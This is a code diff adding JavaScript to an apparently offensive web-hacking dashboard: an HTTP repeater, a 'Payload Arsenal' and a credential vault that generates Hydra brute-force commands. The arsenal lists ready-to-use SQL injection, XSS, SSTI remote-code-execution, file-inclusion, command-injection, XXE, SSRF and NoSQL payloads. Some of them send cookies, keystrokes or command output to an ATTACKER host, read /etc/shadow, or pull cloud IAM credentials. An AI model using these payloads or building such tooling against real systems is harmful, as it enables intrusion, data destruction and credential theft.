+// ═══════════════════════════════════════════════════════════
+// HTTP REPEATER
+// ═══════════════════════════════════════════════════════════
+let _repFollow  = true;
+let _repHistory = [];
+let _lastRepMethod = 'GET', _lastRepUrl = '';
+
+function setRepFollow(v) {
+  _repFollow = v;
+  document.getElementById('rep-fw-on').classList.toggle('active',  v);
+  document.getElementById('rep-fw-off').classList.toggle('active', !v);
+}
+
+function updateRepBody() {
+  const m = document.getElementById('rep-method')?.value || 'GET';
+  document.getElementById('rep-body-wrap').style.display =
+    ['POST','PUT','PATCH'].includes(m) ? 'block' : 'none';
+}
+
+function sendRepeater() {
+  const url = document.getElementById('rep-url').value.trim();
+  if (!url) { log('Enter a URL first', 'error'); return; }
+  const btn = document.getElementById('btn-rep');
+  btn.textContent = '… Sending'; btn.disabled = true;
+  _lastRepMethod = document.getElementById('rep-method').value;
+  _lastRepUrl    = url;
+  socket.emit('http_request', {
+    method:  _lastRepMethod,
+    url,
+    headers: document.getElementById('rep-hdrs').value,
+    body:    document.getElementById('rep-body').value.trim(),
+    follow:  _repFollow,
+  });
+  log(`Repeater → ${_lastRepMethod} ${url}`, 'info');
+}
+
+function renderRepHistory() {
+  const hist  = document.getElementById('rep-hist');
+  const count = document.getElementById('rep-hist-count');
+  count.textContent = _repHistory.length ? `(${_repHistory.length})` : '';
+  hist.innerHTML = '';
+  _repHistory.forEach(r => {
+    const sc  = r.status || 0;
+    const col = sc >= 500 ? 'var(--r)' : sc >= 400 ? 'var(--a)' : sc >= 300 ? 'var(--c)' : 'var(--g)';
+    const pill = document.createElement('div');
+    pill.className = 'rep-pill';
+    pill.innerHTML = `
+      <span style="color:${col};font-size:9px;min-width:28px">${sc}</span>
+      <span style="color:rgba(0,200,255,.5);font-size:9px">${r.method}</span>
+      <span class="rep-pill-url">${r.url}</span>
+      <span style="color:rgba(160,216,200,.3);font-size:9px;white-space:nowrap">${r.ms}ms</span>
+    `;
+    pill.onclick = () => {
+      document.getElementById('rep-url').value    = r.url;
+      document.getElementById('rep-method').value = r.method;
+      updateRepBody();
+    };
+    hist.appendChild(pill);
+  });
+}
+
+function copyResp() {
+  const text = document.getElementById('resp-body').textContent;
+  if (!text) return;
+  navigator.clipboard.writeText(text).then(() => log('Copied response body', 'info'));
+}
+
+socket.on('http_response', data => {
+  const btn = document.getElementById('btn-rep');
+  btn.textContent = '▶ Send'; btn.disabled = false;
+
+  if (data.error) {
+    document.getElementById('resp-badge').textContent  = 'ERROR';
+    document.getElementById('resp-badge').style.color  = 'var(--r)';
+    document.getElementById('resp-reason').textContent = '';
+    document.getElementById('resp-ms').textContent     = '';
+    document.getElementById('resp-size').textContent   = '';
+    document.getElementById('resp-hdrs').innerHTML     = '';
+    document.getElementById('resp-body').textContent   = data.error;
+    showRight('resp');
+    log(`Repeater error: ${data.error}`, 'error');
+    return;
+  }
+
+  const sc  = data.status;
+  const col = sc >= 500 ? 'var(--r)' : sc >= 400 ? 'var(--a)' : sc >= 300 ? 'var(--c)' : 'var(--g)';
+  document.getElementById('resp-badge').textContent  = sc;
+  document.getElementById('resp-badge').style.color  = col;
+  document.getElementById('resp-reason').textContent = data.reason;
+  document.getElementById('resp-ms').textContent     = `${data.ms}ms`;
+  document.getElementById('resp-size').textContent   = `${(data.size/1024).toFixed(1)}KB`;
+
+  // Headers
+  const hd = document.getElementById('resp-hdrs');
+  hd.innerHTML = Object.entries(data.headers || {}).slice(0, 24).map(([k, v]) =>
+    `<div class="resp-hdr-row"><span class="resp-hdr-k">${k}</span><span class="resp-hdr-v">${v}</span></div>`
+  ).join('');
+
+  // Body
+  document.getElementById('resp-body').textContent = data.body || '(empty body)';
+
+  showRight('resp');
+
+  _repHistory.unshift({ method: _lastRepMethod, url: _lastRepUrl, status: sc, ms: data.ms });
+  if (_repHistory.length > 12) _repHistory.pop();
+  renderRepHistory();
+
+  log(`Repeater ← ${sc} ${data.reason}  ${data.ms}ms  ${(data.size/1024).toFixed(1)}KB`, sc >= 400 ? 'warn' : 'success');
+});
+
+// ═══════════════════════════════════════════════════════════
+// PAYLOAD ARSENAL
+// ═══════════════════════════════════════════════════════════
+{% raw %}
+const PAYLOADS = {
+  'SQLi': [
+    { label:'Auth bypass',      pay:"' OR '1'='1"                                                                            },
+    { label:'Auth bypass 2',    pay:"' OR 1=1-- -"                                                                           },
+    { label:'Auth bypass 3',    pay:"admin'-- -"                                                                             },
+    { label:'Auth bypass \"',   pay:'" OR "1"="1"-- -'                                                                      },
+    { label:'Union 2-col',      pay:"' UNION SELECT 1,2-- -"                                                                 },
+    { label:'Union 3-col',      pay:"' UNION SELECT 1,2,3-- -"                                                               },
+    { label:'DB version',       pay:"' UNION SELECT @@version,2-- -"                                                         },
+    { label:'DB name',          pay:"' UNION SELECT database(),2-- -"                                                        },
+    { label:'Tables (MySQL)',   pay:"' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -" },
+    { label:'Columns',          pay:"' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -" },
+    { label:'Sleep blind',      pay:"' AND SLEEP(5)-- -"                                                                     },
+    { label:'MSSQL time-based', pay:"'; WAITFOR DELAY '0:0:5'-- -"                                                          },
+    { label:'Boolean true',     pay:"' AND 1=1-- -"                                                                          },
+    { label:'Boolean false',    pay:"' AND 1=2-- -"                                                                          },
+    { label:'Error-based',      pay:"' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"                              },
+    { label:'Stacked',          pay:"'; DROP TABLE users;-- -"                                                               },
+  ],
+  'XSS': [
+    { label:'Script tag',       pay:'<script>alert(document.domain)<\/script>'                                               },
+    { label:'Img onerror',      pay:'<img src=x onerror=alert(1)>'                                                          },
+    { label:'SVG onload',       pay:'<svg onload=alert(1)>'                                                                  },
+    { label:'Body tag',         pay:'<body onload=alert(1)>'                                                                 },
+    { label:'Input autofocus',  pay:'<input autofocus onfocus=alert(1)>'                                                     },
+    { label:'Details tag',      pay:'<details open ontoggle=alert(1)>'                                                       },
+    { label:'JavaScript URI',   pay:'javascript:alert(document.domain)'                                                     },
+    { label:'Exfil cookie',     pay:"<script>fetch('http://ATTACKER/?c='+btoa(document.cookie))<\/script>"                  },
+    { label:'Keylogger',        pay:'<script>document.onkeypress=e=>fetch(`http://ATTACKER/?k=${e.key}`)<\/script>'          },
+    { label:'AngularJS SSTI',   pay:"{{constructor.constructor('alert(1)')()} }"                                             },
+    { label:'CSP bypass',       pay:'<script src=//ATTACKER/xss.js><\/script>'                                              },
+    { label:'Polyglot',         pay:'"><img src=x onerror=alert(1)><"'                                                      },
+  ],
+  'SSTI': [
+    { label:'Detect',           pay:'{{7*7}}'                                                                                },
+    { label:'Detect (Twig)',    pay:'{{7*"7"}}'                                                                              },
+    { label:'Detect (ERB)',     pay:'<%= 7*7 %>'                                                                             },
+    { label:'Detect (Mako)',    pay:'${7*7}'                                                                                 },
+    { label:'Jinja2 globals',   pay:"{{ self.__init__.__globals__ }}"                                                        },
+    { label:'Jinja2 config',    pay:'{{ config }}'                                                                           },
+    { label:'Jinja2 request',   pay:'{{ request.environ }}'                                                                  },
+    { label:'Jinja2 RCE',       pay:"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}" },
+    { label:'Twig RCE',         pay:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"    },
+    { label:'FreeMarker RCE',   pay:'${"freemarker.template.utility.Execute"?new()("id")}'                                  },
+    { label:'Tornado',          pay:"{% import os %}{{ os.popen('id').read() }}"                                             },
+    { label:'ERB RCE',          pay:'<%= `id` %>'                                                                           },
+  ],
+  'LFI': [
+    { label:'/etc/passwd',      pay:'../../../../etc/passwd'                                                                 },
+    { label:'/etc/passwd abs',  pay:'/etc/passwd'                                                                            },
+    { label:'/etc/shadow',      pay:'../../../../etc/shadow'                                                                 },
+    { label:'/etc/hosts',       pay:'../../../../etc/hosts'                                                                  },
+    { label:'/proc/self/environ',pay:'../../../../proc/self/environ'                                                         },
+    { label:'/proc/self/cmdline',pay:'../../../../proc/self/cmdline'                                                         },
+    { label:'Null byte',        pay:'../../../../etc/passwd%00'                                                              },
+    { label:'Double dot',       pay:'....//....//etc/passwd'                                                                 },
+    { label:'Double encode',    pay:'..%252f..%252fetc%252fpasswd'                                                           },
+    { label:'PHP filter b64',   pay:'php://filter/convert.base64-encode/resource=index.php'                                 },
+    { label:'PHP input',        pay:'php://input'                                                                            },
+    { label:'Data URI RCE',     pay:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='                    },
+    { label:'Apache access.log',pay:'/var/log/apache2/access.log'                                                            },
+    { label:'Auth.log',         pay:'/var/log/auth.log'                                                                      },
+  ],
+  'CMDi': [
+    { label:'Semicolon',        pay:'; id'                                                                                   },
+    { label:'Pipe',             pay:'| id'                                                                                   },
+    { label:'Ampersand',        pay:'& id'                                                                                   },
+    { label:'AND',              pay:'&& id'                                                                                  },
+    { label:'Backtick',         pay:'`id`'                                                                                   },
+    { label:'Subshell',         pay:'$(id)'                                                                                  },
+    { label:'Blind sleep',      pay:'; sleep 5'                                                                              },
+    { label:'Blind OOB curl',   pay:'; curl http://ATTACKER/$(id|base64 -w0)'                                               },
+    { label:'Blind OOB DNS',    pay:'; nslookup `id`.ATTACKER'                                                              },
+    { label:'Newline bypass',   pay:'%0a id'                                                                                 },
+    { label:'Windows & whoami', pay:'& whoami'                                                                               },
+    { label:'Win PowerShell',   pay:'| powershell -c whoami'                                                                },
+  ],
+  'XXE': [
+    { label:'File read',        pay:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'                        },
+    { label:'SSRF via XXE',     pay:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/">]><foo>&xxe;</foo>'                         },
+    { label:'Blind OOB',        pay:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]><foo>bar</foo>'          },
+    { label:'PHP filter',       pay:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>' },
+    { label:'CDATA wrap',       pay:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>'           },
+  ],
+  'SSRF': [
+    { label:'Localhost',        pay:'http://127.0.0.1'                                                                       },
+    { label:'Localhost 0',      pay:'http://0.0.0.0'                                                                         },
+    { label:'IPv6 loopback',    pay:'http://[::1]'                                                                           },
+    { label:'AWS metadata',     pay:'http://169.254.169.254/latest/meta-data/'                                               },
+    { label:'AWS IAM creds',    pay:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'                     },
+    { label:'GCP metadata',     pay:'http://metadata.google.internal/computeMetadata/v1/?recursive=true'                    },
+    { label:'Azure metadata',   pay:'http://169.254.169.254/metadata/instance?api-version=2021-02-01'                       },
+    { label:'Gopher Redis',     pay:'gopher://localhost:6379/_INFO%0D%0A'                                                    },
+    { label:'File scheme',      pay:'file:///etc/passwd'                                                                     },
+    { label:'Bypass @',         pay:'http://attacker@127.0.0.1'                                                              },
+    { label:'Bypass hex IP',    pay:'http://0x7f000001'                                                                      },
+    { label:'Bypass octal',     pay:'http://0177.0.0.1'                                                                     },
+  ],
+  'NoSQL': [
+    { label:'MongoDB $ne null', pay:'{"username": {"$ne": null}, "password": {"$ne": null}}'                                },
+    { label:'MongoDB $gt empty',pay:'{"username": "admin", "password": {"$gt": ""}}'                                        },
+    { label:'MongoDB $regex',   pay:'{"username": {"$regex": "admin"}, "password": {"$gt": ""}}'                            },
+    { label:'MongoDB $where',   pay:'{"$where": "sleep(5000)"}'                                                              },
+    { label:'URL param bypass', pay:'username[$ne]=invalid&password[$ne]=invalid'                                            },
+    { label:'GraphQL introspect',pay:'{"query":"{__schema{types{name}}}"}'                                                   },
+    { label:'GraphQL all',      pay:'{"query":"{ __typename }"}'                                                             },
+    { label:'Elasticsearch',    pay:'/_all/_search?q=*'                                                                      },
+    { label:'CouchDB all',      pay:'/_all_docs'                                                                             },
+  ],
+};
+{% endraw %}
+
+let _payCategory = 'SQLi';
+
+function selectPayCat(el, cat) {
+  _payCategory = cat;
+  document.querySelectorAll('#pay-cats .chip').forEach(c => c.classList.toggle('active', c === el));
+  document.getElementById('pay-search').value = '';
+  renderPayloads();
+}
+
+function renderPayloads() {
+  const q   = (document.getElementById('pay-search')?.value || '').toLowerCase();
+  const lst = document.getElementById('pay-list');
+  const all = PAYLOADS[_payCategory] || [];
+  const set = q ? all.filter(p => p.label.toLowerCase().includes(q) || p.pay.toLowerCase().includes(q)) : all;
+  lst.innerHTML = '';
+  if (!set.length) {
+    lst.innerHTML = '<div style="color:rgba(0,200,255,.3);font-size:10px;text-align:center;padding:10px">No matches</div>';
+    return;
+  }
+  set.forEach(p => {
+    const row = document.createElement('div');
+    row.className = 'pay-card';
+    const lbl = document.createElement('span');
+    lbl.className = 'pay-label'; lbl.textContent = p.label;
+    const txt = document.createElement('span');
+    txt.className = 'pay-text'; txt.textContent = p.pay;
+    const acts = document.createElement('div');
+    acts.className = 'pay-actions';
+    const cpyBtn = document.createElement('button');
+    cpyBtn.className = 'pay-copy'; cpyBtn.textContent = '⎘';
+    cpyBtn.title     = 'Copy payload';
+    cpyBtn.onclick   = () => copyText(cpyBtn, p.pay);
+    const atkBtn = document.createElement('button');
+    atkBtn.className = 'pay-atk'; atkBtn.textContent = '→';
+    atkBtn.title     = 'Send to Attack wordlist';
+    atkBtn.onclick   = () => {
+      const words = document.getElementById('a-words');
+      words.value += (words.value ? '\n' : '') + p.pay;
+      setAMode('wordlist');
+      showLeft('atk');
+      log(`Payload → Attack: ${p.label}`, 'info');
+    };
+    acts.append(cpyBtn, atkBtn);
+    row.append(lbl, txt, acts);
+    lst.appendChild(row);
+  });
+}
+
+// ═══════════════════════════════════════════════════════════
+// CREDENTIAL VAULT
+// ═══════════════════════════════════════════════════════════
+const CREDS_KEY = 'netwatch-creds';
+let _creds = [];
+
+function loadCreds() {
+  try { _creds = JSON.parse(localStorage.getItem(CREDS_KEY) || '[]'); } catch { _creds = []; }
+}
+function saveCreds() { localStorage.setItem(CREDS_KEY, JSON.stringify(_creds)); }
+
+function renderCreds() {
+  loadCreds();
+  const list  = document.getElementById('cv-list');
+  const count = document.getElementById('cv-count');
+  count.textContent = _creds.length ? `(${_creds.length})` : '';
+  list.innerHTML = '';
+  if (!_creds.length) {
+    list.innerHTML = '<div style="color:rgba(0,200,255,.3);font-size:10px;text-align:center;padding:10px">Vault empty — add creds above</div>';
+    return;
+  }
+  _creds.forEach((c, i) => {
+    const row  = document.createElement('div');
+    row.className = 'cv-row';
+    const user = document.createElement('span'); user.className = 'cv-user'; user.textContent = c.user;
+    const pass = document.createElement('span'); pass.className = 'cv-pass'; pass.textContent = c.pass;
+    const svc  = document.createElement('span'); svc.className  = 'cv-svc';  svc.textContent  = c.service;
+    const host = document.createElement('span'); host.className = 'cv-host'; host.textContent = c.host || '—';
+    const acts = document.createElement('div');  acts.className = 'cv-act';
+
+    const cpyBtn = document.createElement('button');
+    cpyBtn.className = 'cv-btn cv-copy'; cpyBtn.textContent = '⎘';
+    cpyBtn.title     = `Copy ${c.user}:${c.pass}`;
+    cpyBtn.onclick   = () => copyText(cpyBtn, `${c.user}:${c.pass}`);
+
+    const hydraBtn = document.createElement('button');
+    hydraBtn.className = 'cv-btn cv-hydra'; hydraBtn.textContent = 'Hydra';
+    hydraBtn.onclick   = () => {
+      showRight('log'); showLeft('atk');
+      const cmd = buildHydraCmd(c);
+      log('── Hydra command ──', 'info');
+      log('  ' + cmd, 'hit');
+    };
+
+    const delBtn = document.createElement('button');
+    delBtn.className = 'cv-btn cv-del'; delBtn.textContent = '✕';
+    delBtn.onclick   = () => { _creds.splice(i, 1); saveCreds(); renderCreds(); };
+
+    acts.append(cpyBtn, hydraBtn, delBtn);
+    row.append(user, pass, svc, host, acts);
+    list.appendChild(row);
+
+    if (c.note) {
+      const note = document.createElement('div');
+      note.style.cssText = 'width:100%;color:rgba(160,216,200,.35);font-size:9px;padding:0 2px 2px;word-break:break-all';
+      note.textContent = '↳ ' + c.note;
+      list.appendChild(note);
+    }
+  });
+}
+
+function buildHydraCmd(c) {
+  const SVC_MAP = {
+    SSH:'ssh', FTP:'ftp', SMB:'smb', RDP:'rdp',
+    MySQL:'mysql', PostgreSQL:'postgres', MSSQL:'mssql',
+    Redis:'redis', MongoDB:'mongodb', HTTP:'http-get', Other:'ssh',
+  };
+  const proto   = SVC_MAP[c.service] || 'ssh';
+  const hostPart = c.host?.split(':')[0] || 'TARGET';
+  const portPart = c.host?.includes(':') ? ` -s ${c.host.split(':')[1]}` : '';
+  return `hydra -l '${c.user}' -p '${c.pass}'${portPart} ${hostPart} ${proto}`;
+}
+
+function addCred() {
+  const user = document.getElementById('cv-user').value.trim();
+  const pass = document.getElementById('cv-pass').value.trim();
+  if (!user || !pass) { log('Username and password are required', 'error'); return; }
+  loadCreds();
+  _creds.push({
+    user,
+    pass,
+    service: document.getElementById('cv-svc').value,
+    host:    document.getElementById('cv-host').value.trim(),
+    note:    document.getElementById('cv-note').value.trim(),
+    added:   new Date().toISOString(),
+  });
+  saveCreds();
+  renderCreds();
+  ['cv-user','cv-pass','cv-note'].forEach(id => document.getElementById(id).value = '');
+  log(`Cred saved: ${user} @ ${document.getElementById('cv-svc').value}`, 'success');
+}
+
+function clearCreds() {
+  if (!confirm('Clear all stored credentials?')) return;
+  _creds = []; saveCreds(); renderCreds();
+}
+
+function exportCreds() {
+  loadCreds();
+  const blob = new Blob([JSON.stringify(_creds, null, 2)], { type: 'application/json' });
+  const a    = document.createElement('a');
+  a.href     = URL.createObjectURL(blob);
+  a.download = `netwatch-creds-${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  log(`Exported ${_creds.length} credentials`, 'success');
+}
+
+// Auto-populate host hint in creds vault when a scan starts
+socket.on('scan_status', ({state, host}) => {
+  if (state === 'running' && host) {
+    const ch = document.getElementById('cv-host');
+    if (!ch.value) ch.placeholder = host;
+  }
+});
+
+// ─── Initialize ──────────────────────────────────────────
+renderPayloads();
+
+document.getElementById('s-host').addEventListener('keydown', e => { if (e.key === 'Enter') launchScan(); });
+document.getElementById('a-url').addEventListener('keydown',  e => { if (e.key === 'Enter') launchAttack(); });
+document.getElementById('hash-in').addEventListener('keydown', e => { if (e.key === 'Enter') identifyHash(); });
 </script>
 </body>
 </html>
